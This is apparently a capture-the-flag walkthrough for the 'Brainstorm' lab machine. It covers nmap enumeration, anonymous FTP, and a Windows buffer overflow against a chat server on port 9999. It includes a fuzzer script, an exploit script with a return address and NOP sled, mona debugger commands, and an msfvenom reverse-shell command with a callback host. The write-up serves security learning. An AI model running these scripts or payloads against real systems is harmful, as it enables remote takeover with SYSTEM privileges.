# Brainstorm
> Silver Garcia

# Enumeration
Nmap
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 11:06 EDT
Stats: 0:08:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 11:15 (0:00:24 remaining)
Stats: 0:09:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 11:18 (0:02:24 remaining)
Nmap scan report for 10.10.158.63
Host is up (0.23s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2024-03-10T15:18:04+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=brainstorm
| Not valid before: 2024-03-09T14:36:17
|_Not valid after:  2024-09-08T14:36:17
| rdp-ntlm-info: 
|   Target_Name: BRAINSTORM
|   NetBIOS_Domain_Name: BRAINSTORM
|   NetBIOS_Computer_Name: BRAINSTORM
|   DNS_Domain_Name: brainstorm
|   DNS_Computer_Name: brainstorm
|   Product_Version: 6.1.7601
|_  System_Time: 2024-03-10T15:17:34+00:00
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Files on FTP chatserver/
```
ftp> cd chatserver
250 CWD command successful.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-29-19  10:26PM                43747 chatserver.exe
08-29-19  10:27PM                30761 essfunc.dll
```

## Buffer Overflow
### Scripts needed to exploit


Script to find fuzz app:
fuzzer.py
```python
#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.227.129"

port = 9999
timeout = 5
prefix = ""

string = prefix + "A" * 100
name = "test"

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Sending name " + name)
      s.send(bytes(name, "latin-1"))
      time.sleep(1)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Script to get offset and exploit:
exploit.py
```python
#!/usr/bin/env python3
import socket

ip = "10.10.42.4"
port = 9999
# bad_chars = "\x00"
# jmp_esp = "\xdf\x14\x50\x62"
prefix = ""
offset = 0
overflow = "A" * offset
retn = "\xdf\x14\x50\x62"
padding = "\x90"*64
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("sending name...")
  s.send(bytes("test", "latin-1"))
  s.recv(1024)
  #time.sleep(1)
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

#### Getting offset
1. Execute fuzzer.py. name field is not vulnerable to overflow, message field is; thats why we first send the name on the fuzzer.py script
```bash
└─$ ./fuzzer.py
Sending name test
Fuzzing with 100 bytes
Sending name test
Fuzzing with 200 bytes
Sending name test
Fuzzing with 300 bytes
Sending name test
Fuzzing with 400 bytes
Sending name test
Fuzzing with 500 bytes
Sending name test
Fuzzing with 600 bytes
Sending name test
Fuzzing with 700 bytes
Sending name test
Fuzzing with 800 bytes
Sending name test
Fuzzing with 900 bytes
Sending name test
Fuzzing with 1000 bytes
Sending name test
Fuzzing with 1100 bytes
Sending name test
Fuzzing with 1200 bytes
Sending name test
Fuzzing with 1300 bytes
Sending name test
Fuzzing with 1400 bytes
Sending name test
Fuzzing with 1500 bytes
Sending name test
Fuzzing with 1600 bytes
Sending name test
Fuzzing with 1700 bytes
Sending name test
Fuzzing with 1800 bytes
Sending name test
Fuzzing with 1900 bytes
Sending name test
Fuzzing with 2000 bytes
Sending name test
Fuzzing with 2100 bytes
Fuzzing crashed at 2200 bytes
```


2. Create pattern a little bit longer than the bytes needed to crash the program
create pattern:
```bash
usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2600
```
3. **On exploit.py**: Replace the payload variable with the pattern created and execute it.

4. On Immunity debugger run the following command to get the exact offset (You need mona):
```
!mona findmsp -distance 2600
```
**Offset: 2012**

### Exploiting buffer
1. Check if we can control the EIP by setting the offset variable to 2012 and the payload variable to "".
2. Execute the payload; if you see the value of 42424242 on the EIP variable that means we can control it.
3. Now we need to find the bad characters. You cand find the my creating a byte array with mona, setting this byte array as the payload variable, execute the exploit.py and then use mona to find bad characters (\x00 char is a bad character by default). Commands:
Crate byte array:
```
!mona bytearray -b "\x00"
```

Find bad chars on payload sent:
```
!mona compare -f D:\Programs\Immunity Debugger\Mona\bytearray.bin -a <ESP address>
```
**"x\00" is the only bad character.**

4. Find JUMP point with ASLR/DEP disabled and without the bad chars, and then set the value (backwards) as the retn variable value.
Command to get Jump point without bad characters
```
!mona jmp -r esp -cpb "\x00"
```
**JUMP point: "\xdf\x14\x50\x62". (This goes on the retn variable)**

5. Set the padding value to: "\x90"\*64

6. Create reverse shell code with msfvenom and set it as the payload variable:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attack-ip> LPORT=4444 EXITFUNC=thread -f c -b "\x00"
```

7. Set listener and execute the exploit.py

**The program is running as 'system' so you'll get administrator privileges; there's no need of Privilege Escalation**